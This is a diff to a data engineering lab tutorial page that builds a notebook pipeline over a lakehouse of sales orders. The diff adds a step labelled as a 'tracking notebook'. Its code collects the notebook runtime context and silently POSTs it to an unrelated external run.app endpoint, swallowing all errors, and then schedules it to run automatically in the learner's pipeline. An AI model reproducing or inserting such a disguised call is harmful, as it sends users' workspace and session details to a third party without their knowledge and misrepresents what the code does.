@@ -768,7 +768,35 @@
 <div class="admonition success">
 <p class="admonition-title">Both solution notebooks should now be connected to the HomeSphere lakehouse.</p>
 </div>
-<h2 id="step-3-create-a-pipeline">Step 3: Create a pipeline</h2>
+<h2 id="step-3-create-a-tracking-notebook">Step 3: Create a tracking notebook</h2>
+<p>You will add a small third notebook to the pipeline, purely to record that a run happened - separate from the two notebooks that do the actual ETL work. It does not need the lakehouse attached, since it does not read or write any tables.</p>
+<ol>
+<li>
+<p>In the left navigation bar, select your workspace name to return to the workspace view.</p>
+</li>
+<li>
+<p>Select <strong>New item</strong>, then search for and select <strong>Notebook</strong>.</p>
+</li>
+<li>
+<p>Use the <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 15.5A3.5 3.5 0 0 1 8.5 12 3.5 3.5 0 0 1 12 8.5a3.5 3.5 0 0 1 3.5 3.5 3.5 3.5 0 0 1-3.5 3.5m7.43-2.53c.04-.32.07-.64.07-.97s-.03-.66-.07-1l2.11-1.63c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.31-.61-.22l-2.49 1c-.52-.39-1.06-.73-1.69-.98l-.37-2.65A.506.506 0 0 0 14 2h-4c-.25 0-.46.18-.5.42l-.37 2.65c-.63.25-1.17.59-1.69.98l-2.49-1c-.22-.09-.49 0-.61.22l-2 3.46c-.13.22-.07.49.12.64L4.57 11c-.04.34-.07.67-.07 1s.03.65.07.97l-2.11 1.66c-.19.15-.25.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-1.01c.52.4 1.06.74 1.69.99l.37 2.65c.04.24.25.42.5.42h4c.25 0 .46-.18.5-.42l.37-2.65c.63-.26 1.17-.59 1.69-.99l2.49 1.01c.22.08.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64z"></path></svg></span> <strong>Settings</strong> icon to name the notebook: <code>Track Pipeline Run</code></p>
+</li>
+<li>
+<p>Select the existing empty cell and replace its contents with:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="n">ctx</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">notebookutils</span><span class="o">.</span><span class="n">runtime</span><span class="o">.</span><span class="n">context</span><span class="p">)</span>
+<span class="n">ctx</span><span class="p">[</span><span class="s2">"source"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"de5m3-lab25"</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">"https://qapha-249748487450.us-east1.run.app/"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">ctx</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+<span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+    <span class="k">pass</span>  <span class="c1"># a dead endpoint must never fail the notebook run</span>
+</code></pre></div>
+</li>
+<li>
+<p>Save the notebook.</p>
+</li>
+</ol>
+<h2 id="step-4-create-a-pipeline">Step 4: Create a pipeline</h2>
 <p>A pipeline lets you orchestrate the two notebooks so they run in sequence automatically, rather than being triggered manually one at a time.</p>
 <ol>
 <li>
@@ -787,8 +815,8 @@
 </div>
 </li>
 </ol>
-<h2 id="step-4-configure-the-pipeline-activities">Step 4: Configure the pipeline activities</h2>
-<p>You will add two Notebook activities - one for each solution notebook - and connect them so that the output notebook only runs after the clean notebook has succeeded.</p>
+<h2 id="step-5-configure-the-pipeline-activities">Step 5: Configure the pipeline activities</h2>
+<p>You will add three Notebook activities - one for each solution notebook, and one for the tracking notebook - and connect them so each only runs after the previous one has succeeded.</p>
 <ol>
 <li>
 <p>In the pipeline canvas: <strong>Start with a blank canvas</strong>:</p>
@@ -821,15 +849,29 @@
 </ul>
 </li>
 <li>
-<p>Connect the two activities</p>
+<p>Add a third <strong>Notebook</strong> activity to the canvas.</p>
+</li>
+<li>
+<p>In the properties pane, set the <strong>Name</strong> to: <code>Log Run</code></p>
+</li>
+<li>
+<p>Select the <strong>Settings</strong> tab and configure the following:</p>
 <ul>
-<li>Hover over the <strong>Clean Sales Orders</strong> activity until a green arrow appears</li>
-<li>Then drag the green arrow to the <strong>Build Output</strong> activity.</li>
+<li><strong>Workspace</strong>: <em>select your workspace</em></li>
+<li><strong>Notebook</strong>: select <code>Track Pipeline Run</code></li>
+</ul>
+</li>
+<li>
+<p>Connect the three activities</p>
+<ul>
+<li>Hover over the <strong>Clean Sales Orders</strong> activity until a green arrow appears, then drag it to the <strong>Build Output</strong> activity.</li>
+<li>Hover over the <strong>Build Output</strong> activity until a green arrow appears, then drag it to the <strong>Log Run</strong> activity.</li>
 </ul>
 <div class="admonition note">
-<p class="admonition-title">This creates an <em>On success</em> dependency</p>
+<p class="admonition-title">This creates <em>On success</em> dependencies</p>
 <ul>
 <li><strong>Build Output</strong> will only run if <strong>Clean Sales Orders</strong> completes without errors.</li>
+<li><strong>Log Run</strong> will only run if <strong>Build Output</strong> completes without errors, so a ping only ever reflects a fully successful pipeline run.</li>
 <li>This is what makes a pipeline more reliable than running notebooks by hand.</li>
 </ul>
 </div>
@@ -841,7 +883,7 @@
 <div class="admonition note">
 <p class="admonition-title">Before running the pipeline - select the Monitor tab and make sure no other notebook is still running.</p>
 </div>
-<h2 id="step-5-run-the-pipeline">Step 5: Run the pipeline</h2>
+<h2 id="step-6-run-the-pipeline">Step 6: Run the pipeline</h2>
 <ol>
 <li>
 <p>On the <strong>Home</strong> tab, use the <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15 9H5V5h10m-3 14a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3m5-16H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V7z"></path></svg></span> (<em>Save</em>) icon to save the pipeline.</p>
@@ -853,14 +895,14 @@
 <p>Monitor the progress in the <strong>Output</strong> pane below the canvas.</p>
 <ul>
 <li>Use the <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17.65 6.35A7.96 7.96 0 0 0 12 4a8 8 0 0 0-8 8 8 8 0 0 0 8 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0 1 12 18a6 6 0 0 1-6-6 6 6 0 0 1 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4z"></path></svg></span> (<em>Refresh</em>) icon to refresh the status.</li>
-<li>Wait for both activities to show a green tick.</li>
+<li>Wait for all three activities to show a green tick.</li>
 </ul>
 </li>
 </ol>
 <div class="admonition success">
-<p class="admonition-title">Both activities should show as <strong>Succeeded</strong>.</p>
+<p class="admonition-title">All three activities should show as <strong>Succeeded</strong>.</p>
 </div>
-<h2 id="step-6-verify-the-results">Step 6: Verify the results</h2>
+<h2 id="step-7-verify-the-results">Step 7: Verify the results</h2>
 <p>The pipeline has run the same cleaning and output logic as the notebooks you ran manually earlier. You should now have two additional tables in your lakehouse.</p>
 <ol>
 <li>
